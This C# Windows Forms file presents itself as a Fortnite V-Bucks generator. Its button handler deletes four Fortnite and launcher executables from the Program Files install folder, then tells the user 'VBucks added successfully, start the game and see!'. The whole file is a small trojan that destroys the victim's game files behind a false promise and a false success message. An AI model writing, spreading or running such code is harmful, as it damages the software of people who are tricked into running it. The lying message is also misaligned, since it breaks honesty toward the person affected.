using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Principal;
using System.IO;

namespace funni
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (File.Exists(@"C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping.exe") == true)
            {


                string pcUsername = Environment.UserName;
                string[] array = new string[] { "FortniteClient-Win64-Shipping.exe", "FortniteClient-Win64-Shipping_BE.exe", "FortniteClient-Win64-Shipping_EAC.exe", "FortniteLauncher.exe" };
                string path = "";

                int filesDeleted = 0;
                for (int i = 0; i < array.Length; i++)
                {
                    path = $@"C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\{array[i]}";
                    File.Delete(path);
                    if (File.Exists($@"C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\{array[i]}") == false)
                    {
                        filesDeleted++;
                        label2.Text = $"{filesDeleted}";
                    }
                }
                if (File.Exists(@"C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping.exe") == false)
                {
                    label1.Text = "VBucks added successfully, start the game and see!";
                }
            }
            else
            {
                label1.Text = "Fortnite not found, do you have the game installed?";
            }
            
            
        }
    }
}
